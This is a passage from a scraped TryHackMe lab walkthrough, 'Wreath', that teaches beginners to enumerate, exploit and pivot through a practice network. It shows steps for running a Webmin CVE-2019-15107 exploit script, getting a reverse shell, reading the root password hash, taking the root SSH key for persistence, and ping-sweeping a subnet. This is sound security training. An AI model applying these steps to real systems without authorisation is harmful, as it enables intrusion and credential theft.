{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/ffa81460a5c1487dd7bb43d0ca0735a1.png', 'title': 'Wreath', 'description': "Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)", 'code': 'wreath', 'users': 386, 'tags': ['pivoting', 'empire', 'av evasion', 'network', 'wreath', 'beginner', 'easy', 'git', 'socat', 'chisel', 'sshuttle', 'proxy', 'forwarding', 'c2', 'antivirus', 'c#', 'obfuscation'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 2130, 'created': '2021-01-02T14:02:23.561Z', 'published': '2021-03-22T11:27:13.615Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://assets.tryhackme.com/room-banners/wreath_banner.png', 'creator': 'MuirlandOracle', 'tasks': [{'taskTitle': '<span class="badge badge-soft-info size-16">Intro</span>   Introduction', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/UHU2GcA_hrY" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="center"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ffa81460a5c1487dd7bb43d0ca0735a1.png" style="width:198px;height:198px" /><br /></p><p align="left">Wreath is designed as a learning resource for beginners with a primary focus on:</p><div align="left"><ul><li>Pivoting</li><li>Working with the Empire C2 (<b>C</b>ommand and <b>C</b>ontrol) framework</li><li>Simple Anti-Virus evasion techniques</li></ul></div><p align="left">The following topics will also be covered, albeit more briefly: </p><ul><li>Code Analysis (Python and PHP)</li><li>Locating and modifying public exploits<br /></li><li>Simple webapp enumeration and exploitation<br /></li><li>Git Repository Analysis</li><li>Simple Windows Post-Exploitation techniques</li><li>CLI Firewall Administration (CentOS and Windows)</li><li>Cross-Compilation techniques</li><li>Coding wrapper programs</li><li>Simple exfiltration techniques<br /></li><li>Formatting a pentest report<br /></li></ul><p align="left">These will be taught in the course of exploiting the Wreath network. </p><p align="left"> </p><p align="left">This is designed as almost a sandbox environment to follow along with the teaching content; the focus will be on the above teaching points, rather than on initial access and privilege escalation exploits (contrary to other boxes on the platform where the focus is on the challenge).</p><hr /><p align="left"><i><u><b><span style="font-size:18px">Tools:</span></b></u></i><br />A zipfile containing the tools demonstrated throughout this room is attached to this task. That said, whilst these will work, it would be advisable to download the latest versions of the tools (as instructed by the tasks) during your progression through the content, rather than relying on the provided archive. The password for this zipfile is: <code>WreathNetwork</code>.</p><hr /><p align="left"><u><i><b><span style="font-size:18px">Videos:</span></b></i></u><br /><a href="https://twitter.com/DarkStar7471" target="_blank">@DarkStar7471</a> has kindly created a series of videos to accompany the teaching content in the Wreath network. <span style="color:red">Please use these as your first line of support!</span> Writeups in the form of pentest reports will also be made available.</p><p align="left">The videos can be accessed directly from Dark\'s <a href="https://www.youtube.com/playlist?list=PLsqUCyw0Jf9sMYXly0uuwfKMu34roGNwk" target="_blank">YouTube channel</a>; however, each task in this room also contains a link to the relevant video. <br /></p><p align="left">Look for the "Play" button at the very bottom right of the screen:<br /><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br />This will update on a task-by-task basis so that it always points to the correct video.<br /></p><hr /><p align="left"><u><i><b><span style="font-size:18px">Prerequisites:</span></b></i></u><br />This network is designed for beginners, but assumes basic competence in the <a href="/room/linuxfundamentalspart1" target="_blank">Linux command line</a> and fundamental hacking methodology. The ability to read and write a little code will also be useful. Any other required knowledge will be linked throughout the tasks. If you need help, please feel free to ask in the <a href="https://discord.gg/tryhackme" target="_blank">TryHackMe Discord</a> -- there is a channel set up for this purpose in the help section there.<br /></p><hr /><p align="left"><i><u><b><span style="font-size:18px">Conduct:</span></b></u></i><br />As this network is shared amongst a number of people, it goes without saying: please don\'t mess things up for others in the network. There are no password changes required in any of these tasks, and no files need deleted. At various stages in this network it will be necessary to upload files and tools to the remote box. Please upload these in the format: <code>toolname-username</code> (e.g. <code>socat-MuirlandOracle</code>, <code>shell-MuirlandOracle.aspx</code>, etc) to avoid overwriting work belonging to anyone else. In short, don\'t be a troll, be respectful, and have fun! <br /></p><p align="left">With that being said:- let\'s get started!<br /><span style="font-size:18px">﻿</span></p>', 'taskType': 'downloadable', 'taskNo': 1, 'taskCreated': '2021-01-02T14:03:12.293Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '6016cfeaa2bcf03fc6ab913c', 'questions': [{'questionNo': 1, 'question': 'Read the introduction<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-info size-16">Intro</span>   Accessing the Network', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/UHU2GcA_hrY" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Before we get into the content, we need to know how to access the network.</p><p>Joining the network requires a 7 day streak or a subscription to TryHackMe. To limit the number of networks which have to stay active at any one point, network access will last for 10 days after joining, at which point you will be automatically be removed; however, rejoining does not require a streak so if you didn\'t manage to finish within the ten days, you are free to rejoin immediately and keep at it from where you left off. Progress will not be reset.<br /></p><p>Whether you are using the AttackBox or a local machine to connect to the TryHackMe network, you will need to use OpenVPN with a connection pack specifically designed for this network. </p><p>If you are using a local machine then you will need to download a configuration pack from the <a href="https://tryhackme.com/access" target="_blank">Access</a> page.</p><p>If you are a subscriber and are using the AttackBox then you will be able to find this connection pack in a directory on your desktop. This will be automatically connected when the AttackBox starts so<b> don\'t run the connection pack manually on the AttackBox if you are a subscriber. </b><br /><b></b></p><p>If you are not subscribed then you will need to download the connection pack as normal, copy and paste the contents into a file on the AttackBox, then connect as you would on a local VM.</p><p>Be aware that this is still a VPN (albeit with an automated startup sequence) on the AttackBox so you will need to use <code>ip a</code> to see your available IP addresses. Pick the one that starts with 10.50.x.x and use that for all reverse connections in the network. </p><p><i><b>Note: </b>You are encouraged to use your own VM when attacking the\n Wreath Network. The content in this room will be difficult to cover in \nthe time available with a single AttackBox and the persistence of a \nlocal VM will be hugely advantageous. Equally, certain sections (such as\n the Empire section) will be very difficult to perform in the AttackBox. If you don\'t have a local Kali VM,\xa0 </i><i>pre-built versions can be found for <a href="https://images.kali.org/virtual-images/kali-linux-2020.4-vmware-amd64.7z" target="_blank">VMware </a>or <a href="https://images.kali.org/virtual-images/kali-linux-2020.4-vbox-amd64.ova" target="_blank">VirtualBox</a>; however, installing manually tends to be more reliable if you are comfortable doing so.</i></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2021-01-30T01:54:53.258Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>On the access page, click on the "Network" tab, then select "Wreath" from the dropdown menu:<br /><img alt="Network tab on the access page" style="width:547px" src="https://assets.tryhackme.com/additional/wreath-network/465c6da06e91.png" /><br /></p><p><i><b>Note: </b>this\n will only appear if you have joined the room. If you are only viewing \nthe room just now, click the "Join" button at the top right of this \npage!</i></p><p>Click on the green download button on the access page and save the configuration pack somewhere on your local machine. If this does not work then you may have to click on the "Regenerate" button first, then give it ten seconds before attempting to download the pack.<br /></p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Connecting to OpenVPN on Linux (using either Kali or the AttackBox) can be accomplished using the <code>openvpn</code> client.</p><p>To do this, from the same directory we saved the config in we use the command:<br /><code>sudo openvpn CONFIG_NAME.ovpn </code><br /></p><p>Obviously replacing the name of the config with the config that you downloaded. Wreath config packs follow a naming scheme of <code>USERNAME-wreath.ovpn</code>, so an example command might be:<br /><code>sudo openvpn MuirlandOracle-wreath.ovpn</code><br /><img style="width:915px" alt="Successful OpenVPN connection sequence" src="https://assets.tryhackme.com/additional/wreath-network/9960e8de7561.png" /><br /></p><p>This should give you access to the Wreath network!</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Without closing the connection, open a new terminal (<code>Ctrl + T</code> in most cases). This is the easiest way (technically speaking) to run the OpenVPN client in the background whilst still being able to use the CLI. If you are comfortable using a terminal multiplexer (e.g. Tmux) to create a connection in the background then doing so would be a more elegant solution.<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p style="font-size:18px"><u><b>Controlling the Network:</b></u><br /></p><p>The network has three states: Running, Stopped, and Resetting.</p><p>The current state can be shown at the top right of the network box at the top of the page:<br /><img style="width:921.1px" alt="Network Diagram Example" src="https://assets.tryhackme.com/additional/wreath-network/fe129fa984de.png" /><br /></p><ul><li>Running means that the network is fully operational and can be connected to at will</li><li>Stopped indicates that the network has gone to sleep. This happens when no one has pressed the "Extend" button within a set time limit so as to prevent the network from being constantly running with no one using it. It can be restarted by pressing the "Start" button. This does <i>not</i> reset the network back to a clean copy, so anything stored on the targets should still be there</li><li>Resetting indicates that the network is currently in the process of being wiped clean and resetting back to its default state. This can be used when something (or someone) has happened to one of the targets rendering it broken</li></ul><p>The three buttons below the network map can be used to control this functionality:<br /><img style="width:341px" alt="Control buttons: Start, Extend, Reset" src="https://assets.tryhackme.com/additional/wreath-network/fbf6ced6514d.png" /><br /></p><ul><li>The "Start" button restarts the network once stopped</li><li>The "Extend" button prevents the network from going to sleep. This button also contains a timer showing how long until the network shuts down<br /></li><li>The "Reset" button initiates a full wipe of the network. This requires a percentage of users in the network to click the button, thus preventing a single person from spamming resets </li></ul><p>Finally, the "Network Uptime" field at the bottom right of the network map indicates how long the network has been awake for. This is not necessarily the time since the last reset.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-info size-16">Intro</span>   Backstory', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/UHU2GcA_hrY" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p><i>Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:</i></p><blockquote><p><b><i>"So I heard you got into hacking? That\'s awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"</i></b></p></blockquote><p><i>You take a moment to think about it, before deciding to accept the job -- it\'s for a friend after all. </i></p><p><i>Turning down his offer of payment, you tell him:</i><br /></p><p></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2021-01-02T14:03:26.892Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "I'll do it!<br />", 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-info size-16">Intro</span>   Brief', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/UHU2GcA_hrY" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Thomas has sent over the following information about the network:</p><hr /><p><i>There are two machines on my home network that host projects and stuff I\'m working on in my own time -- one of them has a webserver that\'s port forwarded, so that\'s your way in if you can find a vulnerability! It\'s serving a website that\'s pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you\'ll be able to get into that as it has protections turned on, doesn\'t run anything vulnerable, and can\'t be accessed by the public-facing section of the network. Well, I say PC -- it\'s technically a repurposed server because I had a spare license lying around, but same difference.<br /></i></p><hr /><p>From this we can take away the following pieces of information:</p><ul><li>There are three machines on the network</li><li>There is at least one public facing webserver</li><li>There is a self-hosted git server somewhere on the network</li><li>The git server is internal, so Thomas may have pushed sensitive information into it<br /></li><li>There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows </li><li>By the sounds of it this is likely to be the server variant of Windows, which might work in our favour<br /></li><li>The (assumed) Windows PC cannot be accessed directly from the webserver</li></ul><p>This is enough to get started!</p><p><i><b>Note: </b>You are also encouraged to treat this Network like a penetration test -- i.e. \ntake notes and screenshots of every step and write a full report at the \nend (especially if you\'re not already familiar with writing such \nreports). Keeping track of any files (e.g. tools or payloads) and users you create would also be a good idea. Reports will not be marked, but the act of writing them is good practice for any professional work -- or certifications -- you may do in the future. There will be more information on the actual report writing in the </i><code>Debrief &amp; Report</code><i> task, but for now just focus on extensive notes and screenshots. If you are not already comfortable taking notes, have a look into <a href="https://www.giuspen.com/cherrytree/" target="_blank">CherryTree</a> or <a href="https://www.notion.so/" target="_blank">Notion</a> as hierarchical notetaking applications and focus on documenting every step of the process. This room is written in a way that encourages easy note taking, so note down your kill-chain as you go along, and take lots of screenshots! Reports can be submitted to the room as writeups (in the format specified in the questions of\xa0 the </i><code>Debrief &amp; Report</code><i> task) -- the first five high-quality writeups submitted to the room are featured here!</i></p><ul><li><i><a href="https://assets.tryhackme.com/additional/wreath-network/writeups/CheckN8 - Wreath.pdf" target="_blank">CheckN8</a></i></li><li><i><a href="https://assets.tryhackme.com/additional/wreath-network/writeups/lolKatz - Wreath.pdf" target="_blank">fil</a></i></li><li><i><a href="https://assets.tryhackme.com/additional/wreath-network/writeups/SefD - Wreath.pdf" target="_blank">SefD</a></i></li><li><i><a href="https://assets.tryhackme.com/additional/wreath-network/writeups/M4t35Z - Wreath.pdf" target="_blank">M4t35Z</a></i></li><li><i><a href="https://assets.tryhackme.com/additional/wreath-network/writeups/IamNobody - Wreath.pdf" target="_blank">IamNobody</a></i></li></ul>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2021-01-02T14:11:47.689Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Let's go!<br />", 'hint': ''}, {'questionNo': 2, 'question': "<p>Before we start, if you are using Kali, make sure that it's up to date:<br /><code>sudo apt update &amp;&amp; sudo apt upgrade</code><br /></p><p>This should not be necessary on the AttackBox.<br /></p>", 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-danger size-16">Webserver</span>   Enumeration', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/3ddDBa6tAq0" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="center"><b>As with any attack, we first begin with the enumeration phase. Completing the <a href="https://tryhackme.com/room/furthernmap" target="_blank">Nmap</a> room (if you haven\'t already) will help with this section.</b></p><p align="center"><b>Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let\'s start by performing a port scan on the first 15000 ports of this IP.</b></p><p align="center"><i><b>Note:</b> Here (and in general), it\'s a good idea to save your scan results to a file so you don\'t have to re-run the same scan twice.</i><br /></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2021-01-02T17:14:30.562Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'How many of the first 15000 ports are open on the target?<br />', 'hint': 'nmap -p-15000  -vv TARGET_IP -oG initial-scan'}, {'questionNo': 2, 'question': '<p>Perform a service scan on these open ports.<br /></p><p>What OS does Nmap think is running?<br /></p>', 'hint': 'This will be given by the webserver. Note that Nmap is unlikely to get a valid result with -O, so use the headers from the webserver to ascertain the OS.'}, {'questionNo': 3, 'question': "<p>Okay, we know what we're dealing with. </p><p>Open the IP in your browser -- what site does the server try to redirect you to?</p>", 'hint': ''}, {'questionNo': 4, 'question': '<p>You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!</p><p>Add it to your hosts file manually. This can be accomplished by editing the <code>/etc/hosts</code> file on Linux/MacOS, or <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> on Windows, to include the IP address, followed by a tab, then the domain name. <b>Note: </b>this <i>must</i> be done as root/Administrator.</p><p>It should look something like this when done, although the <i>IP address and domain name will be different</i>:</p><code>10.10.10.10 example.thm</code>', 'hint': "Make sure you don't include the https://. It should just be domainname.thm"}, {'questionNo': 5, 'question': '<p>Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -&gt; "Accept Risk"; however, you should never do this in the real world.<br /></p><p>In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!<br /></p><p>Read through the text on the page. What is Thomas\' mobile phone number?</p>', 'hint': 'Look at the bottom of the page.'}, {'questionNo': 6, 'question': "<p>Let's have a look at the highest open port.<br /></p><p>Look back at your service scan results: what server version does Nmap detect as running here?</p>", 'hint': ''}, {'questionNo': 7, 'question': '<p>Put your answer to the last question into Google.</p><p>It appears that this service is vulnerable to an unauthenticated remote code execution exploit!</p><p>What is the CVE number for this exploit?</p>', 'hint': 'CVE-XXXX-XXXXX'}, {'questionNo': 8, 'question': "<p>We have everything we need to break into this machine, so let's get going!</p>", 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-danger size-16">Webserver</span>   Exploitation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/hu4d6nexAog" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>In the previous task we found a vulnerable service<sup><a href="https://sensorstechforum.com/cve-2019-15107-webmin/" target="_blank">[1]</a></sup><sup><a href="https://www.webmin.com/exploit.html" target="_blank">[2]</a></sup> running on the target which will give us the ability to execute commands on the target.</p><p>The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided <a href="https://github.com/MuirlandOracle/CVE-2019-15107" target="_blank">here</a>.</p><hr /><p>Start by cloning the repository. This can be done with the following command:</p><p><code>git clone https://github.com/MuirlandOracle/CVE-2019-15107</code><br /></p><p>This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:</p><p><code>cd CVE-2019-15107 &amp;&amp; pip3 install -r requirements.txt</code><br /></p><p>If this doesn\'t work, you may need to install pip before downloading the libraries. This can be done with:<br /><code>sudo apt install python3-pip</code><br /></p><p>The script should already be executable, but if not, add the executable bit (<code>chmod +x ./CVE-2019-15107.py</code>).</p><p>Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it\'s doing. (Don\'t worry if you aren\'t familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn\'t malicious. It is, however, good practice to read through scripts before running them).<br /></p><p>Once you\'re satisfied that the script will do what it says it will, run the exploit against the target!</p><p><code>./CVE-2019-15107.py TARGET_IP</code></p><p><img style="width:619px" alt="Demonstration of the exploit" src="https://assets.tryhackme.com/additional/wreath-network/a876ed2dd7ce.png" /></p><hr /><p>[1] <a href="https://sensorstechforum.com/cve-2019-15107-webmin/" target="_blank">https://sensorstechforum.com/cve-2019-15107-webmin/</a><br />[2] <a href="https://www.webmin.com/exploit.html" target="_blank">https://www.webmin.com/exploit.html</a><br /></p><p></p><p></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2021-01-02T17:24:45.603Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Run the exploit and obtain a pseudoshell on the target!<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Which user was the server running as?<br /></p>', 'hint': 'Type "whoami" and press enter.'}, {'questionNo': 3, 'question': "<p>Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.</p><p>Before we do though: nice though this pseudoshell is, it's not a full reverse shell.</p><p>Get a reverse shell from the target. You can either do this manually, or by typing <code>shell</code> into the pseudoshell and following the instructions given.<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': '<p><b>Optional:</b> Stabilise the reverse shell. There are several techniques for doing this detailed <a href="https://tryhackme.com/room/introtoshells" target="_blank">here</a>.<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': "<p>Now for a little post-exploitation!</p><p>What is the root user's password hash?<br /></p>", 'hint': 'Where are passwords stored in Linux systems?'}, {'questionNo': 6, 'question': "<p>You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.</p><p>What is the full path to this file?<br /></p>", 'hint': 'Where are SSH keys usually stored?'}, {'questionNo': 7, 'question': "<p>Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command <code>chmod 600 KEY_NAME</code> (substituting in the name of the key) to obtain persistent access to the box.<br /></p><p>We have everything we need for now. Let's move on to the next section: Pivoting!<br /></p>", 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span>   What is Pivoting?', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/seYiYHHJOkc" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.</p><p>Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and use it to access other machines in the network that would not otherwise be accessible:</p><p><img style="width:75%;margin:auto" alt="Diagram showing an attacker machine outwith a target network with one public facing webserver and three terminals in an internal network." src="https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png" /><br /></p><p>In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public server, we can then pivot to attack the remaining three targets.</p><p><i><b>Note: </b>This is an example diagram and is not representative of the Wreath Network.</i></p><p>This section will contain a lot of theory for pivoting from both Linux and Windows compromised targets, which we will then put into practice against the next machine in the network. Remember though: you have a sandbox environment available to you with the compromised machine in the Wreath network. After the enumeration tasks coming up, you\'ll also know about the next machine in the network. Feel free to use these boxes to play around with the tools as you go through the tasks, but be aware that some techniques may be stopped by the firewalls involved (which we will look at mitigating later in the network).<br /></p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2021-01-02T17:15:21.256Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the pivoting introduction<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span>   High-level Overview', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/xv9bCJLv-DU" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being, we\'ll be looking at more manual techniques for pivoting.</p><p>There are two main methods encompassed in this area of pentesting:</p><ul><li><b>Tunnelling/Proxying: </b>Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be <i>tunnelled</i> inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic <b>I</b>ntrusion <b>D</b>etection <b>S</b>ystem (IDS) or firewall<br /></li><li><b>Port Forwarding:</b> Creating a connection between a local port and a single port on a target, via a compromised host</li></ul><p>A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.</p><p>Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device. </p><p>Which style of pivoting is more suitable will depend entirely on the layout of the network, so we\'ll have to start with further enumeration before we decide how to proceed. It would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box at the top of the screen.</p><p>As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.<br /></p><p>The remaining tasks in this section will cover the following topics:</p><ul><li>Enumerating a network using native and statically compiled tools</li><li>Proxychains / FoxyProxy</li><li>SSH port forwarding and tunnelling (primarily Unix)</li><li>plink.exe (Windows)</li><li>socat (Windows and Unix)<br /></li><li>chisel (Windows and Unix)</li><li>sshuttle (currently Unix only)</li></ul><p>This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.</p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2021-01-05T19:13:29.730Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p><b>Research: </b>Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?<br /></p>', 'hint': 'Google: "meterpreter command for port forwarding"'}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Enumeration', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/lmMqlt5R38Y" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>As always, enumeration is the key to success. Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what\'s around us. </p><p>There are five possible ways to enumerate a network through a compromised host:</p><ol><li>Using material found on the machine. The hosts file or ARP cache, for example<br /></li><li>Using pre-installed tools<br /></li><li>Using statically compiled tools</li><li>Using scripting techniques </li><li>Using local tools through a proxy</li></ol><p>These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it\'s very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we\'ll cover below). </p><p><img style="width:200px;padding:20px;float:left" alt="Tux the penguin with a toolkit" src="https://assets.tryhackme.com/additional/wreath-network/NWRkOTMzODNi.jpg" class="note-float-left" />Before anything else though, it\'s sensible to check to see if there are any pieces of useful information stored on the target. <code>arp -a</code> can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in <code>/etc/hosts</code> on Linux, or <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> on Windows.\xa0<code> /etc/resolv.conf</code> on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with <code>ipconfig /all</code>. Linux has an equivalent command as an alternative to reading the resolv.conf file: <code>nmcli dev show</code>.<br /></p><p>If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it\'s possible to get <i>static</i> copies of many tools. These are versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on <i>any</i> target, assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in various places on the internet. A good (if dated) resource for these can be found <a href="https://github.com/andrew-d/static-binaries" target="_blank">here</a>. A more up-to-date (at the time of writing) version of Nmap for Linux specifically can be found <a href="https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip" target="_blank">here</a>.  Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they require different syntax, or don\'t work in quite the way that you\'ve come to expect.</p><p><i><b>Note: </b>The difference between a "static" binary and a "dynamic"\n binary is in the compilation. Most programs use a variety of external \nlibraries (</i><code>.so</code><i> files on Linux, or </i><code>.dll</code><i>\n files on Windows) -- these are referred to as "dynamic" programs. \nStatic programs are compiled with these libraries built into the \nfinished executable file. When we\'re trying to use the binary on a \ntarget system we will nearly always need a statically compiled copy of \nthe program, as the system may not have the dependencies installed \nmeaning that a dynamic binary would be unable to run.</i></p><p>Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is <i>very</i> slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy <i>specifically against the found ports</i>.</p><hr /><p>Before putting this all into practice let\'s talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you\'ll find that Nmap is <b>not</b> installed on the currently compromised server of the Wreath network). If this happens, it\'s worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:</p><p><code>for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &amp;); done</code><br 